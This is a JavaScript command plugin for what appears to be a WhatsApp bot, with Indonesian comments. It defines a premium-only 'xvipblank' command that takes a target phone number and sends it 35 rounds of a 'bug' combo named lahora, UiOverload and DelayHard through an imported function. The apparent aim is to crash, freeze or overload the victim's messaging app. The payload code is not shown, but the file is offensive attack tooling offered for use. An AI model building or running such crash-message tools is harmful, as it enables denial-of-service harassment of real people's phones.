// plugins/bug/xvipblank.js — perintah "xvipblank" (1 file = 1 perintah).
// Dipecah dari hasil_date.js case "xvipblank" — tanpa pengurangan (35x lahora + UiOverload + DelayHard).
import { sendXvipBlank, requirePhoneTarget, getBugTargetBlockReason, sleep } from "@/src/services/bug/index.js";

export default {
  name: "xvipblank",
  aliases: [],
  description: "Kirim kombo bug lahora + UiOverload + DelayHard ke nomor target (35 iterasi)",
  usage: "628xxx",
  category: "Bug",
  premiumOnly: true,
  run: async (sock, msg, args, { reply, prefix, commandName, isPrimarySuperOwner }) => {
    const q = args.join(" ");
    if (!q) return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
    let target;
    try {
      target = requirePhoneTarget(q);
    } catch (_) {
      return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
    }
    const blocked = getBugTargetBlockReason(sock, target, { isPrimarySuperOwner });
    if (blocked) return reply(blocked);
    await reply(`*Success! Send Bug to ${target}*`);
    await sendXvipBlank(sock, target, { loops: 35 });
    await sleep(500);
    console.log("\x1b[31m\x1b[1mSuccess!\x1b[0m");
  },
};
